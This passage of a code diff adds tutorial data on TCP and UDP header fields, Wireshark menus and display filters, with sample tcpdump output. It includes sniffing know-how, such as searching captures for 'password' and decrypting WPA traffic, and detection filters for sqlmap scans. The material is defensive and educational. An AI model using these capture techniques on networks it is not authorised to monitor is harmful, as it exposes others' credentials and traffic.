+            {"step": 1, "title": "Standard segment", "desc": "No options needed", "from": "TCP", "to": "Header", "data": "Offset=5 (20 bytes)", "color": "#16a085"},
+            {"step": 2, "title": "TCP needs options", "desc": "Add MSS + window scaling", "from": "TCP", "to": "Header", "data": "+12 bytes", "color": "#f39c12"},
+            {"step": 3, "title": "Offset updated", "desc": "Offset becomes 8 (32 bytes)", "from": "TCP", "to": "Header", "data": "Offset=8 (32 bytes)", "color": "#27ae60"}
+        ]
+    },
+    {
+        "id": "flags",
+        "name": "Flags (Control Bits)",
+        "size": "9 bits (1 bit each + reserved)",
+        "color": "#f39c12",
+        "purpose": "Single-bit control signals that tell the receiver what kind of packet this is — SYN, ACK, FIN, RST, PSH, URG, ECE, CWR.",
+        "details": [
+            "URG — Urgent data present",
+            "ACK — Acknowledgment field is valid",
+            "PSH — Push data to application immediately",
+            "RST — Reset (abort) the connection",
+            "SYN — Synchronize sequence numbers (start connection)",
+            "FIN — Finish (gracefully close connection)",
+            "ECE — ECN Echo (congestion signalled)",
+            "CWR — Congestion Window Reduced"
+        ],
+        "example": "SYN=1 + ACK=0 → connection request; SYN=1 + ACK=1 → connection accepted",
+        "real_output": """See flags in tcpdump:
+Flags [S]     → SYN
+Flags [S.]    → SYN-ACK
+Flags [.]     → ACK
+Flags [P.]    → PSH+ACK (data)
+Flags [F.]    → FIN+ACK (close)
+Flags [R]     → RST (abort)
+
+Example handshake:
+1. Client → SYN          Flags [S]     seq 1000
+2. Server → SYN-ACK      Flags [S.]    seq 5000 ack 1001
+3. Client → ACK          Flags [.]     seq 1001 ack 5001
+4. Client → Data         Flags [P.]    seq 1001 ack 5001 length 517""",
+        "scenario": "TCP flags are the 'verbs' of TCP. Without SYN, you can't start. Without ACK, no reliability. Without FIN, no graceful close. RST is the emergency stop.",
+        "simulation": [
+            {"step": 1, "title": "SYN", "desc": "Client asks to start connection", "from": "Client", "to": "Server", "data": "Flags: SYN", "color": "#3498db"},
+            {"step": 2, "title": "SYN-ACK", "desc": "Server accepts and sends own SYN", "from": "Server", "to": "Client", "data": "Flags: SYN,ACK", "color": "#27ae60"},
+            {"step": 3, "title": "ACK", "desc": "Client confirms — connection open", "from": "Client", "to": "Server", "data": "Flags: ACK", "color": "#f39c12"},
+            {"step": 4, "title": "PSH+ACK", "desc": "Real data transferred", "from": "Client", "to": "Server", "data": "Flags: PSH,ACK", "color": "#9b59b6"},
+            {"step": 5, "title": "FIN+ACK", "desc": "Client initiates close", "from": "Client", "to": "Server", "data": "Flags: FIN,ACK", "color": "#e74c3c"}
+        ]
+    },
+    {
+        "id": "window",
+        "name": "Window Size",
+        "size": "16 bits (2 bytes)",
+        "color": "#e67e22",
+        "purpose": "Tells the sender how many bytes the receiver is currently willing to accept — this is TCP's flow control mechanism.",
+        "details": [
+            "Range: 0 to 65,535 bytes (without scaling)",
+            "With Window Scaling option: up to 1 GB",
+            "Advertised by the receiver, obeyed by the sender",
+            "Prevents fast sender from overwhelming slow receiver"
+        ],
+        "example": "Window=64240 means 'I can accept up to 64KB right now'",
+        "real_output": """$ tcpdump -nn -i eth0
+14:23:45 IP 192.168.1.10.54321 > 142.250.185.78.443:
+  Flags [S], seq 1000, win 64240
+
+14:23:45 IP 142.250.185.78.443 > 192.168.1.10.54321:
+  Flags [S.], seq 5000, ack 1001, win 65535
+
+Interpretation:
+Client: "I can receive 64240 bytes"
+Server: "I can receive 65535 bytes"
+
+If client says win 0:
+Server STOPS sending — receiver's buffer is full
+= "Zero Window" — a flow control pause""",
+        "scenario": "Imagine a firehose filling a bucket. The window size is the receiver saying 'my bucket can hold X more gallons' — so the sender adjusts the flow. Without it, TCP would drown slow devices.",
+        "simulation": [
+            {"step": 1, "title": "Sender goes fast", "desc": "Server sending 100 MB/sec", "from": "Server", "to": "Client", "data": "Huge throughput", "color": "#e67e22"},
+            {"step": 2, "title": "Client buffer filling", "desc": "Client can't process that fast", "from": "Client", "to": "Buffer", "data": "85% full", "color": "#f39c12"},
+            {"step": 3, "title": "Window shrinks", "desc": "Client advertises small window", "from": "Client", "to": "Server", "data": "Win=4096", "color": "#3498db"},
+            {"step": 4, "title": "Sender slows", "desc": "Server reduces sending rate", "from": "Server", "to": "Client", "data": "Slower flow", "color": "#27ae60"}
+        ]
+    },
+    {
+        "id": "checksum",
+        "name": "Checksum",
+        "size": "16 bits (2 bytes)",
+        "color": "#c0392b",
+        "purpose": "Error-detection field that lets the receiver verify the segment arrived without corruption.",
+        "details": [
+            "Calculated over: pseudo-header + TCP header + data",
+            "One's complement of the one's complement sum",
+            "If checksum fails → segment is silently dropped → TCP retransmits",
+            "Weak protection (only 16 bits) — can miss rare errors, but usually works"
+        ],
+        "example": "Checksum 0x1A2B validates the whole segment integrity",
+        "real_output": """Calculating TCP checksum (simplified):
+
+1. Build pseudo-header:
+   SRC IP (4 bytes) + DST IP (4 bytes)
+   + 0x00 + Protocol (0x06 for TCP)
+   + TCP length (2 bytes)
+
+2. Add TCP header + data, split into 16-bit words:
+   Sum all words together
+
+3. Fold carries back into 16 bits
+
+4. Complement (invert all bits)
+
+Result: e.g., 0x1A2B
+
+Receiver does same calculation:
+• If match → segment accepted
+• If mismatch → drop silently → sender retransmits
+
+Real-world example: damaged ethernet frame → checksum fails → TCP retransmits automatically""",
+        "scenario": "Checksum is a lightweight integrity check. A single bit flip during transmission is caught here — the segment is dropped, and TCP's retransmission ensures data eventually arrives intact.",
+        "simulation": [
+            {"step": 1, "title": "Sender calculates", "desc": "Sum all 16-bit words + complement", "from": "Sender", "to": "TCP Stack", "data": "Checksum=0x1A2B", "color": "#c0392b"},
+            {"step": 2, "title": "Segment sent", "desc": "Travels across network", "from": "Sender", "to": "Network", "data": "Bits in transit", "color": "#3498db"},
+            {"step": 3, "title": "Bit flip occurs", "desc": "Cosmic ray / bad cable flips 1 bit", "from": "Network", "to": "Segment", "data": "Corruption!", "color": "#e74c3c"},
+            {"step": 4, "title": "Receiver verifies", "desc": "Recomputes checksum", "from": "Receiver", "to": "TCP Stack", "data": "MISMATCH", "color": "#c0392b"},
+            {"step": 5, "title": "Segment dropped", "desc": "Silently discarded, no ACK sent", "from": "TCP Stack", "to": "Void", "data": "Dropped", "color": "#e67e22"},
+            {"step": 6, "title": "Sender retransmits", "desc": "Timeout fires, segment resent", "from": "Sender", "to": "Receiver", "data": "Resend OK", "color": "#27ae60"}
+        ]
+    },
+    {
+        "id": "urgent_ptr",
+        "name": "Urgent Pointer",
+        "size": "16 bits (2 bytes)",
+        "color": "#8e44ad",
+        "purpose": "Points to the end of urgent data when the URG flag is set. Rarely used in practice.",
+        "details": [
+            "Only meaningful when URG flag = 1",
+            "Offset from the sequence number",
+            "Lets the receiver jump to the urgent byte",
+            "Modern applications rarely use this — Telnet historically used it for Ctrl+C"
+        ],
+        "example": "URG=1 + Urgent Pointer=100 → 'Data at Seq+100 is urgent'",
+        "real_output": """Historically used by Telnet:
+User presses Ctrl+C
+→ Telnet sends URG flag + urgent pointer
+→ Server jumps to that byte and processes interrupt
+
+Today:
+• Almost never used
+• Most firewalls ignore it
+• Some scanners set URG to test firewall behavior (e.g., nmap -sX XMAS scan)""",
+        "scenario": "Urgent Pointer is legacy. It was designed for interactive protocols (like Telnet) that needed to interrupt ongoing data. Modern protocols handle this at the application layer instead.",
+        "simulation": [
+            {"step": 1, "title": "App has urgent data", "desc": "User pressed Ctrl+C in Telnet", "from": "App", "to": "TCP", "data": "Interrupt!", "color": "#8e44ad"},
+            {"step": 2, "title": "Set URG flag", "desc": "TCP marks the segment urgent", "from": "TCP", "to": "Header", "data": "URG=1, Ptr=100", "color": "#f39c12"},
+            {"step": 3, "title": "Receiver jumps", "desc": "Skips to urgent byte", "from": "Receiver", "to": "App", "data": "Process interrupt", "color": "#27ae60"}
+        ]
+    },
+    {
+        "id": "options",
+        "name": "TCP Options",
+        "size": "0–40 bytes (variable)",
+        "color": "#34495e",
+        "purpose": "Optional extensions that tune TCP behavior — MSS, Window Scaling, Selective ACK, Timestamps, etc.",
+        "details": [
+            "Maximum Size Segment (MSS) — largest TCP payload a host accepts",
+            "Window Scaling — multiplies window size by 2^n (n up to 14) → up to 1 GB",
+            "SACK (Selective ACK) — acknowledges non-contiguous blocks (faster recovery)",
+            "Timestamps — RTT measurement + PAWS (protection against wrapped sequence)",
+            "Only present if Data Offset > 5"
+        ],
+        "example": "Options: MSS=1460, SACK permitted, Timestamps, NOP, Window Scale=7",
+        "real_output": """$ tcpdump -nn -v -i eth0 port 443 | grep "Options"
+Options: [mss 1460, sackOK, TS val 1234567 ecr 0, nop, wscale 7]
+
+Interpretation:
+• MSS=1460        Max segment size = 1460 bytes
+• sackOK          Selective ACK supported
+• TS val 1234567  Timestamp for RTT measurement
+• wscale 7        Window scale = 2^7 = 128× normal
+                  → Advertised window can be up to 65535×128 = 8.3 MB
+
+Without these options:
+• Sending large files would be slower
+• Retransmission on loss would be inefficient
+• Slow networks would underutilize bandwidth""",
+        "scenario": "TCP Options are negotiated during the handshake. Modern TCP uses them to squeeze performance out of high-bandwidth, high-latency networks — this is why a download from 10,000 km away can still hit 100 Mbps.",
+        "simulation": [
+            {"step": 1, "title": "SYN with options", "desc": "Client advertises its capabilities", "from": "Client", "to": "Server", "data": "MSS=1460, wscale=7", "color": "#34495e"},
+            {"step": 2, "title": "Server SYN-ACK", "desc": "Server responds with its options", "from": "Server", "to": "Client", "data": "MSS=1460, wscale=8", "color": "#3498db"},
+            {"step": 3, "title": "Both use options", "desc": "Every future segment uses optimized settings", "from": "Both", "to": "Network", "data": "Faster transfer", "color": "#27ae60"}
+        ]
+    }
+]
+
+UDP_SEGMENT_FIELDS = [
+    {
+        "id": "src_port",
+        "name": "Source Port",
+        "size": "16 bits (2 bytes)",
+        "color": "#3498db",
+        "purpose": "Identifies the sending application on the source device.",
+        "details": [
+            "Range: 0–65535",
+            "Optional — can be 0 if no reply is expected",
+            "Allows the receiver to reply to the correct process",
+            "For DNS queries, client uses an ephemeral port like 54321"
+        ],
+        "example": "DNS query from client uses source port 54321",
+        "real_output": """$ tcpdump -nn -i eth0 port 53
+14:23:45 IP 192.168.1.10.54321 > 8.8.8.8.53: UDP, length 32
+                    ↑                  ↑
+              SRC PORT 54321       DST PORT 53 (DNS)
+
+Reply comes back:
+14:23:45 IP 8.8.8.8.53 > 192.168.1.10.54321: UDP, length 45
+       ↑                        ↑
+   SRC PORT 53          DST PORT 54321 (client)
+
+Client's OS looks at dst port 54321 → delivers to the DNS resolver in the browser""",
+        "scenario": "Even though UDP is connectionless, the source port lets the reply find its way home. Without it, the browser wouldn't know which tab the DNS answer belongs to.",
+        "simulation": [
+            {"step": 1, "title": "Browser requests DNS", "desc": "Chrome wants to resolve google.com", "from": "Chrome", "to": "OS", "data": "DNS query", "color": "#3498db"},
+            {"step": 2, "title": "OS assigns port", "desc": "Kernel picks 54321", "from": "OS", "to": "UDP Stack", "data": "SRC=54321", "color": "#f39c12"},
+            {"step": 3, "title": "Reply finds home", "desc": "DNS server sends back to port 54321", "from": "8.8.8.8", "to": "Chrome", "data": "Delivered!", "color": "#27ae60"}
+        ]
+    },
+    {
+        "id": "dst_port",
+        "name": "Destination Port",
+        "size": "16 bits (2 bytes)",
+        "color": "#27ae60",
+        "purpose": "Identifies the target service on the destination device.",
+        "details": [
+            "Range: 0–65535",
+            "Well-known services: 53 (DNS), 67/68 (DHCP), 123 (NTP), 161 (SNMP)",
+            "Tells the receiver which service to hand the datagram to"
+        ],
+        "example": "DNS queries go to destination port 53; NTP to 123",
+        "real_output": """Common UDP destination ports:
+53  → DNS       (domain lookup)
+67  → DHCP      (server side)
+68  → DHCP      (client side)
+69  → TFTP      (trivial file transfer)
+123 → NTP       (time sync)
+161 → SNMP      (monitoring)
+162 → SNMP Trap
+514 → Syslog
+
+Example: NTP sync
+$ ntpdate -q pool.ntp.org
+192.168.1.10.53521 > 162.159.200.1.123: UDP, length 48
+Reply: 162.159.200.1.123 > 192.168.1.10.53521""",
+        "scenario": "The destination port is how UDP multiplexes services. A single machine can run DNS, NTP, and SNMP simultaneously — the dst port tells them apart.",
+        "simulation": [
+            {"step": 1, "title": "NTP client wants time", "desc": "OS decides to sync clock", "from": "OS", "to": "UDP Stack", "data": "Query time", "color": "#27ae60"},
+            {"step": 2, "title": "Destination set", "desc": "UDP header: DST=123", "from": "UDP Stack", "to": "Header", "data": "DST=123", "color": "#f39c12"},
+            {"step": 3, "title": "Server delivers", "desc": "Server routes to ntpd process", "from": "Network", "to": "ntpd", "data": "123 → ntpd", "color": "#3498db"}
+        ]
+    },
+    {
+        "id": "length",
+        "name": "Length",
+        "size": "16 bits (2 bytes)",
+        "color": "#9b59b6",
+        "purpose": "Total size of the UDP datagram — including the 8-byte header and payload.",
+        "details": [
+            "Minimum value: 8 (header only, no data)",
+            "Maximum: 65,535 bytes",
+            "Includes header (8 bytes) + data",
+            "If data is 1000 bytes → Length = 1008"
+        ],
+        "example": "Length=1008 → 8 (header) + 1000 (data) bytes",
+        "real_output": """$ tcpdump -nn -i eth0 udp
+14:23:45 IP 192.168.1.10.54321 > 8.8.8.8.53: UDP, length 32
+                                                 ↑
+                                          Length = 32 bytes
+
+That's 8 bytes header + 24 bytes DNS query payload.
+
+Larger example (NTP):
+14:23:50 IP 192.168.1.10.53521 > 162.159.200.1.123: UDP, length 48
+                                                    ↑
+                                          8 header + 40 data
+
+Maximum UDP: Length = 65535 = 8 + 65527
+But in practice, UDP payload is limited to ~1472 bytes to fit in an
+Ethernet frame without IP fragmentation!""",
+        "scenario": "Length is UDP's only self-description — no sequence numbers, no ACKs. The receiver trusts it blindly. This is why UDP is fast but unreliable.",
+        "simulation": [
+            {"step": 1, "title": "Data to send", "desc": "App has 24 bytes (DNS query)", "from": "App", "to": "UDP", "data": "24 bytes data", "color": "#9b59b6"},
+            {"step": 2, "title": "Add header", "desc": "UDP adds 8-byte header", "from": "UDP", "to": "Header", "data": "+8 bytes", "color": "#f39c12"},
+            {"step": 3, "title": "Length stamped", "desc": "Length=32 total", "from": "UDP", "to": "Network", "data": "Length=32", "color": "#27ae60"}
+        ]
+    },
+    {
+        "id": "checksum_udp",
+        "name": "Checksum",
+        "size": "16 bits (2 bytes)",
+        "color": "#c0392b",
+        "purpose": "Optional error-detection field (mandatory for IPv6). Detects corruption of header + payload.",
+        "details": [
+            "Calculated over: pseudo-header + UDP header + data",
+            "Same algorithm as TCP checksum (one's complement sum)",
+            "Optional in IPv4 — a value of 0 means 'not calculated'",
+            "Mandatory in IPv6",
+            "If bad → datagram silently discarded (no retransmission)"
+        ],
+        "example": "Checksum 0x2A5C validates the datagram integrity",
+        "real_output": """Two scenarios:
+
+Scenario A: Good checksum
+Sender: computes checksum 0x2A5C
+Receiver: recomputes → matches → deliver to app
+
+Scenario B: Corrupted
+Sender: computes checksum 0x2A5C
+Bit flip during transit
+Receiver: recomputes → 0x3B4D ≠ 0x2A5C → DISCARD
+          (no notification, no retransmit)
+
+This is why UDP is "best-effort":
+• No ACK
+• No retransmission
+• Application must handle reliability (if needed)
+
+Real-world: DNS often uses TCP for large responses,
+because TCP guarantees delivery.""",
+        "scenario": "UDP checksum is a lightweight integrity check. If it fails, the datagram is dropped and forgotten — no one is notified. This is fine for real-time apps (video, gaming) but bad for critical data.",
+        "simulation": [
+            {"step": 1, "title": "Compute", "desc": "Sender calculates checksum", "from": "Sender", "to": "UDP", "data": "Checksum=0x2A5C", "color": "#c0392b"},
+            {"step": 2, "title": "Send", "desc": "Datagram transmitted", "from": "Sender", "to": "Network", "data": "On the wire", "color": "#3498db"},
+            {"step": 3, "title": "Corruption", "desc": "Bit flips mid-transit", "from": "Network", "to": "Datagram", "data": "Corrupted!", "color": "#e74c3c"},
+            {"step": 4, "title": "Verify", "desc": "Receiver recomputes", "from": "UDP", "to": "Receiver", "data": "MISMATCH", "color": "#c0392b"},
+            {"step": 5, "title": "Discard", "desc": "No notification, just silence", "from": "Receiver", "to": "Void", "data": "Gone forever", "color": "#e67e22"}
+        ]
+    }
+]
+
+# ==================== WIRESHARK: INTERFACE & MENUS ====================
+WIRESHARK_MENUS = [
+    {
+        "name": "File",
+        "icon": "📁",
+        "color": "#3498db",
+        "purpose": "Open, save, merge, export captures and quit Wireshark.",
+        "items": [
+            {"item": "Open", "shortcut": "Ctrl+O", "desc": "Load a saved pcap/pcapng file", "output": """Opens the file browser. Select any .pcap, .pcapng, .cap file.
+Wireshark auto-detects the format."""},
+            {"item": "Save As", "shortcut": "Ctrl+Shift+S", "desc": "Save current capture with a chosen format", "output": """Save As dialog:
+• Filename: mycapture
+• Format: pcapng (default) / pcap / other
+• Compress with gzip: optional
+Click Save → file written to disk"""},
+            {"item": "Merge", "shortcut": "—", "desc": "Combine two capture files into one", "output": """Merge dialog:
+• Select second capture file
+• Choose merge order (chronological / prepend / append)
+• Click Merge → new combined file in memory
+Then File → Save As to persist it"""},
+            {"item": "Export Specified Packets", "shortcut": "—", "desc": "Save only selected/displayed packets", "output": """Export Specified Packets dialog:
+• Packet Range: All / Displayed / Marked / Selected
+• Output format: pcapng / pcap / others
+• File: export_subset.pcapng
+Only the chosen packets are written."""},
+            {"item": "Export Objects", "shortcut": "—", "desc": "Extract transferred files from capture", "output": """Submenu shows: HTTP, SMB, TFTP, IMF, DICOM
+Select HTTP → list of all HTTP objects
+Choose one → Save As to extract the file
+(Example: stage2.ps1, 4198 bytes)"""},
+            {"item": "Quit", "shortcut": "Ctrl+Q", "desc": "Exit Wireshark", "output": """Prompts to save if unsaved capture.
+Otherwise closes immediately."""}
+        ]
+    },
+    {
+        "name": "Edit",
+        "icon": "✏️",
+        "color": "#e67e22",
+        "purpose": "Find packets, mark, time reference, and preferences.",
+        "items": [
+            {"item": "Find Packet", "shortcut": "Ctrl+F", "desc": "Search for packet by filter, hex, string, or regex", "output": """Find toolbar appears above packet list:
+• Display filter: tcp.port == 80
+• Hex value: 4d5a
+• String: GET /admin
+• Regex: (?i)password
+Navigate with Find Next / Previous."""},
+            {"item": "Mark Packet", "shortcut": "Ctrl+M", "desc": "Mark packet for later reference", "output": """Marked packets show with black background in list.
+Useful for flagging interesting packets.
+Marks are lost when file is closed (unless saved)."""},
+            {"item": "Set/Unset Time Reference", "shortcut": "Ctrl+T", "desc": "Set a time reference point for relative timing", "output": """Sets packet's time as zero reference.
+All other packets show relative time (e.g., +0.234s).
+Great for measuring delays between events."""},
+            {"item": "Preferences", "shortcut": "Ctrl+Shift+P", "desc": "Configure Wireshark behavior", "output": """Preferences → Protocols → IEEE 802.11:
+• Enable decryption
+• Add wpa-pwd key: password:SSID
+Used for decrypting WPA/WPA2 traffic."""}
+        ]
+    },
+    {
+        "name": "View",
+        "icon": "👁️",
+        "color": "#9b59b6",
+        "purpose": "Control packet display, coloring, zoom, and layout.",
+        "items": [
+            {"item": "Coloring Rules", "shortcut": "—", "desc": "Customize packet color highlighting", "output": """Default rules:
+• Black: Bad TCP
+• Red: Invalid
+• Light blue: UDP
+• Green: HTTP
+Add custom rule: tcp.port == 3389 → dark red (RDP)"""},
+            {"item": "Time Display Format", "shortcut": "—", "desc": "Change how timestamps are shown", "output": """Options:
+• Seconds Since Beginning of Capture
+• Seconds Since Previous Packet
+• UTC Time / Local Time
+• Absolute Date and Time
+Useful for correlating with logs."""},
+            {"item": "Colorize Packet List", "shortcut": "—", "desc": "Toggle coloring on/off", "output": """Checkbox to enable/disable all coloring.
+Useful when you need uniform display."""}
+        ]
+    },
+    {
+        "name": "Capture",
+        "icon": "📡",
+        "color": "#e74c3c",
+        "purpose": "Start, stop, restart captures and configure capture options.",
+        "items": [
+            {"item": "Start", "shortcut": "Ctrl+E", "desc": "Begin capturing on selected interface", "output": """Starts live capture.
+Status bar shows: Interface, packet count, duration.
+Blue shark fin icon indicates active capture."""},
+            {"item": "Stop", "shortcut": "Ctrl+E", "desc": "Stop the current capture", "output": """Stops capture.
+All packets remain in memory.
+Red square icon indicates stopped."""},
+            {"item": "Restart", "shortcut": "Ctrl+R", "desc": "Stop and immediately restart capture", "output": """Clears current capture buffer and starts fresh.
+Green circular arrow icon."""},
+            {"item": "Capture Options", "shortcut": "Ctrl+K", "desc": "Configure interfaces, filters, and output", "output": """Input Tab:
+• Select interface (eth0, wlan0, lo)
+• Promiscuous mode: ON
+• Snaplen: 262144 bytes
+• Capture filter: tcp port 80
+
+Output Tab:
+• File: capture.pcapng
+• Format: pcapng
+• Auto-stop after: 100 MB / 60 sec
+
+Options Tab:
+• Resolve MAC addresses
+• Resolve network names
+• Resolve transport names"""}
+        ]
+    },
+    {
+        "name": "Analyze",
+        "icon": "🔬",
+        "color": "#f39c12",
+        "purpose": "Display filters, protocol dissection, and stream following.",
+        "items": [
+            {"item": "Display Filter", "shortcut": "—", "desc": "Open filter expression builder", "output": """Helps build complex filters.
+Shows all available fields for a protocol.
+Example: ip.src == 192.168.1.1 && tcp.port == 443"""},
+            {"item": "Follow TCP Stream", "shortcut": "—", "desc": "Reassemble and show full TCP conversation", "output": """Opens Follow TCP Stream window:
+• Client data shown in RED
+• Server data shown in BLUE
+• Full HTTP request + response visible
+• Save As to extract the stream""" },
+            {"item": "Follow UDP Stream", "shortcut": "—", "desc": "Reassemble and show UDP conversation", "output": """Same as TCP stream but for UDP.
+Useful for DNS, DHCP, RTP analysis.""" },
+            {"item": "Expert Information", "shortcut": "—", "desc": "Show warnings, errors, and notable events", "output": """Groups by severity:
+• Chat (blue)
+• Note (cyan)
+• Warn (yellow)
+• Error (red)
+Common: Checksum errors, retransmissions, malformed packets."""},
+            {"item": "Enabled Protocols", "shortcut": "Ctrl+Shift+E", "desc": "Enable/disable protocol dissectors", "output": """Search and toggle protocols.
+Useful when a dissector is misidentifying traffic.
+Disable HTTP if it's parsing non-HTTP traffic on port 80."""}
+        ]
+    },
+    {
+        "name": "Statistics",
+        "icon": "📊",
+        "color": "#27ae60",
+        "purpose": "Summaries, graphs, and protocol statistics.",
+        "items": [
+            {"item": "Capture File Properties", "shortcut": "—", "desc": "Summary of capture file", "output": """Shows:
+• File name, size, SHA256 hash
+• Capture duration, start/end time
+• Packet count, average packet size
+• Interface list
+• Comments field
+Great for documenting evidence."""},
+            {"item": "Protocol Hierarchy", "shortcut": "—", "desc": "Tree of all protocols in capture", "output": """Shows % of traffic per protocol.
+Example:
+• 100% Ethernet
+  • 85% IPv4
+    • 60% TCP
+      • 40% HTTP
+    • 25% UDP
+      • 15% DNS"""},
+            {"item": "Conversations", "shortcut": "—", "desc": "Summary of all conversations", "output": """Tabs: Ethernet, IPv4, IPv6, TCP, UDP
+Columns: Address A, Address B, Packets, Bytes, Duration
+Sort by Bytes to find largest transfers."""},
+            {"item": "Endpoints", "shortcut": "—", "desc": "Summary of all endpoints", "output": """Tabs: Ethernet, IPv4, IPv6, TCP, UDP
+Columns: Address, Packets, Bytes
+Sort by Bytes to find busiest hosts."""},
+            {"item": "I/O Graph", "shortcut": "—", "desc": "Graph traffic over time", "output": """X-axis: time
+Y-axis: packets/sec or bytes/sec
+Add multiple graphs with different filters.
+Spot traffic spikes and anomalies."""}
+        ]
+    },
+    {
+        "name": "Telephony",
+        "icon": "📞",
+        "color": "#16a085",
+        "purpose": "VoIP analysis — SIP, RTP, and call flows.",
+        "items": [
+            {"item": "VoIP Calls", "shortcut": "—", "desc": "List all VoIP calls in capture", "output": """Shows: Start Time, From, To, Protocol, Duration, State
+Click a call → Flow Sequence to see SIP ladder diagram.
+Messages: INVITE, 100 Trying, 180 Ringing, 200 OK, ACK, BYE."""},
+            {"item": "RTP", "shortcut": "—", "desc": "RTP stream analysis", "output": """Submenu: Show All Streams, Stream Analysis
+Lists RTP streams with: SSRC, Payload, Packets, Lost, Jitter
+Select stream → Analyze → Play Streams to hear audio."""},
+            {"item": "SIP", "shortcut": "—", "desc": "SIP call statistics", "output": """SIP Flows and SIP Statistics.
+Shows all SIP methods: INVITE, REGISTER, SUBSCRIBE, NOTIFY.
+Useful for diagnosing call setup failures."""},
+            {"item": "RTP Player", "shortcut": "—", "desc": "Play and visualize RTP audio", "output": """Waveform display of RTP audio.
+Red marks indicate lost packets.
+Play button to hear the audio.
+Save to .au or .wav file."""}
+        ]
+    },
+    {
+        "name": "Tools",
+        "icon": "🔧",
+        "color": "#34495e",
+        "purpose": "Utility tools like firewall ACL generation.",
+        "items": [
+            {"item": "Firewall ACL Rules", "shortcut": "—", "desc": "Generate firewall rules from a packet", "output": """Select a packet → Tools → Firewall ACL Rules.
+Choose format: Cisco IOS, iptables, Windows Firewall.
+Example output (iptables):
+iptables -A INPUT -s 203.0.113.5 -p tcp --dport 22 -j DROP
+Useful for quickly blocking an attacker."""},
+            {"item": "Lua Console", "shortcut": "—", "desc": "Run Lua scripts for custom analysis", "output": """Interactive Lua interpreter.
+Access to Wireshark's Lua API.
+Write custom dissectors and statistics."""}
+        ]
+    }
+]
+
+# ==================== WIRESHARK: DISPLAY FILTERS ====================
+WIRESHARK_FILTERS = [
+    # ---------- BASIC ----------
+    {
+        "category": "Basic",
+        "color": "#3498db",
+        "filters": [
+            {"filter": "ip.addr == 192.168.1.1", "desc": "All traffic to/from IP", "output": "Shows all packets where source OR destination IP is 192.168.1.1"},
+            {"filter": "ip.src == 192.168.1.1", "desc": "Traffic from specific IP", "output": "Only packets originating from 192.168.1.1"},
+            {"filter": "ip.dst == 192.168.1.1", "desc": "Traffic to specific IP", "output": "Only packets destined for 192.168.1.1"},
+            {"filter": "tcp.port == 80", "desc": "Traffic on port 80", "output": "Both source and destination port 80"},
+            {"filter": "tcp.srcport == 80", "desc": "Traffic from source port 80", "output": "Only packets with source port 80 (server responses)"},
+            {"filter": "tcp.dstport == 443", "desc": "Traffic to destination port 443", "output": "Only packets destined for port 443 (HTTPS requests)"}
+        ]
+    },
+    # ---------- HTTP ----------
+    {
+        "category": "HTTP",
+        "color": "#27ae60",
+        "filters": [
+            {"filter": "http", "desc": "All HTTP traffic", "output": "All HTTP requests and responses"},
+            {"filter": "http.request.method == \"GET\"", "desc": "HTTP GET requests", "output": "Only GET requests"},
+            {"filter": "http.request.method == \"POST\"", "desc": "HTTP POST requests", "output": "Only POST requests (login, uploads)"},
+            {"filter": "http.response.code == 200", "desc": "HTTP 200 OK responses", "output": "Only successful responses"},
+            {"filter": "http.response.code >= 400", "desc": "HTTP error responses", "output": "All 4xx and 5xx errors"},
+            {"filter": "http.host contains \"google\"", "desc": "HTTP requests to google", "output": "Requests with Host header containing 'google'"},
+            {"filter": "http.request.uri contains \"admin\"", "desc": "HTTP requests to admin paths", "output": "Any URI containing 'admin' — potential attack"},
+            {"filter": "http.user_agent contains \"sqlmap\"", "desc": "SQLMap scanner traffic", "output": "All requests from sqlmap tool"}
+        ]
+    },
+    # ---------- TCP ----------
+    {
+        "category": "TCP",
+        "color": "#e74c3c",
+        "filters": [
+            {"filter": "tcp.flags.syn == 1 && tcp.flags.ack == 0", "desc": "SYN packets (connection attempts)", "output": "New connection attempts"},
+            {"filter": "tcp.flags.reset == 1", "desc": "RST packets (connection resets)", "output": "Reset connections — refused or errors"},
+            {"filter": "tcp.flags.fin == 1", "desc": "FIN packets (graceful close)", "output": "Normal connection termination"},
+            {"filter": "tcp.analysis.retransmission", "desc": "Retransmitted packets", "output": "Packets retransmitted due to loss — indicates network issues"},
+            {"filter": "tcp.analysis.duplicate_ack", "desc": "Duplicate ACKs", "output": "Receiver got out-of-order packets — possible congestion"},
+            {"filter": "tcp.analysis.zero_window", "desc": "Zero window", "output": "Receiver buffer full — flow control active"},
+            {"filter": "tcp.stream eq 0", "desc": "Specific TCP stream", "output": "All packets belonging to stream 0"}
+        ]
+    },
+    # ---------- DNS ----------
+    {
+        "category": "DNS",
+        "color": "#f39c12",
+        "filters": [
+            {"filter": "dns", "desc": "All DNS traffic", "output": "DNS queries and responses"},
+            {"filter": "dns.qry.name contains \"google\"", "desc": "DNS queries for google", "output": "Queries containing 'google'"},
+            {"filter": "dns.flags.response == 0", "desc": "DNS queries only", "output": "Client queries (not responses)"},
+            {"filter": "dns.flags.response == 1", "desc": "DNS responses only", "output": "Server responses"},
+            {"filter": "dns.qry.type == 1", "desc": "A record queries (IPv4)", "output": "Only A record lookups"}
+        ]
+    },
+    # ---------- TLS/SSL ----------
+    {
+        "category": "TLS/SSL",
+        "color": "#9b59b6",
+        "filters": [
+            {"filter": "tls", "desc": "All TLS traffic", "output": "All TLS handshake and data"},
+            {"filter": "tls.handshake.type == 1", "desc": "Client Hello", "output": "TLS client hello messages"},
+            {"filter": "tls.handshake.type == 2", "desc": "Server Hello", "output": "TLS server hello messages"},
+            {"filter": "tls.handshake.extensions_server_name", "desc": "TLS SNI (hostname)", "output": "Server Name Indication — reveals HTTPS hostname"},
+            {"filter": "tls.record.content_type == 23", "desc": "TLS Application Data", "output": "Encrypted application data"}
+        ]
+    },
+    # ---------- VoIP ----------
+    {
+        "category": "VoIP",
+        "color": "#16a085",
+        "filters": [
+            {"filter": "sip", "desc": "All SIP traffic", "output": "SIP signaling messages"},
+            {"filter": "sip.Method == \"INVITE\"", "desc": "SIP INVITE (call setup)", "output": "Call initiation attempts"},
+            {"filter": "sip.Method == \"BYE\"", "desc": "SIP BYE (call teardown)", "output": "Call termination"},
+            {"filter": "rtp", "desc": "All RTP traffic", "output": "RTP media streams"},
+            {"filter": "rtp.ssrc == 0x12345678", "desc": "Specific RTP stream", "output": "Packets from one RTP stream (by SSRC)"}
+        ]
+    },
+    # ---------- WiFi ----------
+    {
+        "category": "802.11 WiFi",
+        "color": "#e67e22",
+        "filters": [
+            {"filter": "wlan.fc.type_subtype == 0x08", "desc": "Beacon frames", "output": "AP beacons advertising networks"},
